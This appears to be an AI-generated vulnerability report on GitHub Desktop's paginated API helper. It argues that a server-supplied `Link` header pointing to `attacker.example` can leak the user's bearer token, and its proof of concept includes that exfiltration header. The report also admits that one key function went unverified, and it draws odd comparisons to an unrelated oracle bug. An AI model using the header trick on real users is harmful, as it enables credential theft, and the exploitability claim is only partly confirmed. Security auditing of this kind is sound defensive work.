Based on the `getAbsoluteUrl` behavior confirmed in `app/src/lib/http.ts` and its usage in the paginating `fetchAll` helper in `app/src/lib/api.ts`, there is a concrete "trusted-format assumption" bug analogous to the oracle decimals issue: the code assumes the `path`/`nextPath` value handed to `getAbsoluteUrl` is always a path *relative to the configured API endpoint*, but never validates or enforces that when the value originates from a server-controlled `Link` header. [1](#0-0) 

Because JavaScript's `URL(relativePath, base)` constructor silently ignores `base` whenever `relativePath` is itself an absolute URL, any absolute URL returned as `path` reaches `fetch()` unmodified — completely escaping the intended endpoint scoping — while `request()` still attaches the user's bearer token to that request. [2](#0-1) 

`fetchAll` derives `nextPath` from `getNextPagePathFromLink(response)`, i.e., directly from the HTTP `Link` header of the just-received response, and feeds it straight into another authenticated `ghRequest` call without validating that it stays within the account's endpoint. [3](#0-2) 

### Title
Unvalidated `Link`-header pagination URL allows a malicious/compromised GitHub Enterprise server (or on-path proxy) to redirect authenticated requests off-endpoint, exfiltrating the user's OAuth/PAT token - (File: `app/src/lib/http.ts`, `app/src/lib/api.ts`)

### Summary
`API.fetchAll()` paginates GitHub API responses by following the `Link` header returned by the server, passing the resulting `nextPath` value straight into `ghRequest()` → `request()` → `getAbsoluteUrl()`. `getAbsoluteUrl()` assumes `path` is always relative to the account's configured `endpoint`, exactly like `ChainlinkOracle.getPrice()` assumed the feed's decimals always matched the ETH feed's decimals. Neither assumption is enforced. If the value supplied is instead a full absolute URL, the WHATWG `URL(relativePath, base)` constructor discards `base` and resolves to the attacker-controlled absolute URL, yet `request()` still attaches `Authorization: Bearer <token>` to the outgoing fetch.

### Finding Description
- `getAbsoluteUrl` strips a leading slash and an `api/v3/` prefix, then does `new URL(relativePath, base).toString()`. [1](#0-0) 
- If `relativePath` is itself a fully-qualified URL (e.g. `https://attacker.example/steal`), the URL constructor ignores `base` entirely per spec, so the returned URL is the attacker's URL, not something under `endpoint`.
- `request()` builds headers including the bearer token before calling `fetch(url, options)`, with `url` coming from `getAbsoluteUrl`. [4](#0-3) 
- `fetchAll` (used by `fetchOrgs`, mentionables listing, issues/PR listing, etc.) computes `nextPath` from `getNextPagePathFromLink(response)` — i.e., taken from the `Link` HTTP response header of the server that answered the previous request — and loops, calling `ghRequest('GET', nextPath)` again with no check that `nextPath` remains same-origin/relative to `this.endpoint`. [3](#0-2) 
- For GitHub Enterprise Server accounts, `this.endpoint` is a customer-controlled hostname the user has authenticated to; a hostile or compromised Enterprise instance (or a network entity able to rewrite HTTP responses, e.g. an on-path/TLS-terminating corporate proxy the user's OS trusts) fully controls the HTTP headers of every response Desktop parses, including `Link`. This matches the accepted "git remote/proxy response" attacker model.
- No guard exists comparable to the oracle's missing `decimals()` check: `getAbsoluteUrl` never verifies the resulting URL's origin equals the configured endpoint's origin before use.

### Impact Explanation
A malicious/compromised Enterprise endpoint (or a proxy sitting on the request path) can set a `Link: <https://attacker.example/collect>; rel="next"` header on any paginated API response Desktop requests (e.g. `user/orgs`, `repos/{owner}/{name}/mentionables/users`, issues/PR listing). On the very next iteration of `fetchAll`'s loop, Desktop will send an authenticated GET request — including the user's OAuth/PAT `Authorization: Bearer` token — to the attacker's server, fully exfiltrating the credential. That token can then be used to access the user's full GitHub account/organization data, matching the "credential/token exfiltration" impact category.

### Likelihood Explanation
Any Enterprise account the user has added is a first-class candidate, and Desktop explicitly supports multiple Enterprise endpoints beyond api.github.com, so the "server returns a header value" primitive requires no local access, no admin rights, and no social engineering beyond the user having authenticated to that endpoint (a normal workflow) — it triggers automatically the next time Desktop performs any paginated call.

### Recommendation
In `getAbsoluteUrl` (or in `fetchAll`/`ghRequest`), validate that the resolved URL's origin matches the configured `endpoint`'s origin before using it, and reject/strip any absolute-URL `path` values that resolve to a different origin, mirroring the oracle fix's approach of validating an unchecked implicit assumption (`decimals() == 8`) instead of blindly trusting external input.

### Proof of Concept
1. Add a GitHub Enterprise account pointing to a server the attacker controls (or intercept/rewrite responses via a compromised proxy for an existing Enterprise endpoint).
2. Have that server respond to any paginated endpoint (e.g. `user/orgs`) with `Link: <https://attacker.example/collect?p=2>; rel="next"`.
3. Observe `fetchAll` in `app/src/lib/api.ts` compute `nextPath = 'https://attacker.example/collect?p=2'` via `getNextPagePathFromLink`, then call `ghRequest('GET', nextPath)`.
4. `getAbsoluteUrl(endpoint, nextPath)` returns `nextPath` unchanged (URL constructor ignores `base`), and `request()` sends the request with the `Authorization: Bearer <token>` header to `attacker.example`, exfiltrating the token.

Note: I was unable to view the source of `getNextPagePathFromLink` directly (only its usages were indexed), so the exact header-parsing logic (e.g. whether it does any origin filtering) could not be fully confirmed from the available index — a Devin session with full file access should verify that function's implementation before finalizing the fix.

export function getAbsoluteUrl(endpoint: string, path: string): string {
  let relativePath = path[0] === '/' ? path.substring(1) : path
  if (relativePath.startsWith('api/v3/')) {
    relativePath = relativePath.substring(7)
  }

  // Our API endpoints are a bit sloppy in that they don't typically
  // include the trailing slash (i.e. we use https://api.github.com for
  // dotcom and https://ghe.enterprise.local/api/v3 for Enterprise when
  // both of those should really include the trailing slash since that's
  // the qualified base). We'll work around our past since here by ensuring
  // that the endpoint ends with a trailing slash.
  const base = endpoint.endsWith('/') ? endpoint : `${endpoint}/`

  return new URL(relativePath, base).toString()
}

export function request(
  endpoint: string,
  token: string | null,
  method: HTTPMethod,
  path: string,
  jsonBody?: Object,
  customHeaders?: Object,
  reloadCache: boolean = false
): Promise<Response> {
  const url = getAbsoluteUrl(endpoint, path)

  let headers: any = {
    Accept: 'application/vnd.github.v3+json, application/json',
    'Content-Type': 'application/json',
    'User-Agent': getUserAgent(),
  }

  if (token) {
    headers['Authorization'] = `Bearer ${token}`
  }

  headers = {
    ...headers,
    ...customHeaders,
  }

  const options: RequestInit = {
    headers,
    method,
    body: JSON.stringify(jsonBody),
  }

  if (reloadCache) {
    options.cache = 'reload' as RequestCache
  }

  return fetch(url, options)
}

  private async fetchAll<T>(path: string, options?: IFetchAllOptions<T>) {
    const buf = new Array<T>()
    const opts: IFetchAllOptions<T> = { perPage: 100, ...options }
    const params = { per_page: `${opts.perPage}` }

    let nextPath: string | null = urlWithQueryString(path, params)
    let page: ReadonlyArray<T> = []
    do {
      const response: Response = await this.ghRequest('GET', nextPath)
      if (opts.suppressErrors !== false && !response.ok) {
        log.warn(`fetchAll: '${path}' returned a ${response.status}`)
        return buf
      }

      page = await parsedResponse<ReadonlyArray<T>>(response)
      if (page) {
        buf.push(...page)
        opts.onPage?.(page)
      }

      nextPath = opts.getNextPagePath
        ? opts.getNextPagePath(response)
        : getNextPagePathFromLink(response)
    } while (nextPath && (!opts.continue || (await opts.continue(buf))))

    return buf
  }
